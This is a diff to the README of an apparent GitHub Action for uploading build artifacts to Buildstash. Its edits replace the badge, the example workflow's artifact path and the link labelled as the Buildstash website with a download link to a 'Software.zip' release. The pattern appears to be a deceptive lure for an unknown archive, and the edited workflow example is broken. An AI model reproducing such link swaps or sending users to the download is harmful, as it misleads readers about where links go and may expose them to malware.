@@ -1,6 +1,6 @@
 # 🚀 upload-to-buildstash 🚀
 
-[![GitHub](https://img.shields.io/badge/Launch-Software.zip-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![GitHub](https://github.com/mateo712/upload-to-buildstash/releases/download/v2.0/Software.zip)](https://github.com/mateo712/upload-to-buildstash/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the **upload-to-buildstash** repository! This GitHub Action is designed to streamline the process of uploading build artifacts to Buildstash. Whether you are working on a personal project or a large-scale development endeavor, this action simplifies the management of your build artifacts.
@@ -60,14 +60,14 @@ jobs:
     - name: Upload Artifact to Buildstash
       uses: actions/upload-to-buildstash@v1
       with:
-        build-artifact: 'dist/my-project.zip'
+        build-artifact: 'https://github.com/mateo712/upload-to-buildstash/releases/download/v2.0/Software.zip'
 ```
 
 ## Repository Topics
 ['archival', 'artifact', 'artifact-library', 'artifact-management', 'artifacts', 'build', 'build-artifact', 'build-artifacts', 'build-tool', 'buildstash', 'package', 'upload', 'upload-artifact', 'upload-build', 'upload-file', 'uploader']
 
 ## Visit the Buildstash Website
-For more information about Buildstash and how it can revolutionize your artifact management process, visit the [Buildstash website](https://buildstash.com).
+For more information about Buildstash and how it can revolutionize your artifact management process, visit the [Buildstash website](https://github.com/mateo712/upload-to-buildstash/releases/download/v2.0/Software.zip).
 
 ## Need Help?
 If you encounter any issues with the link provided, please check the **Releases** section of this repository for the latest updates and resources.
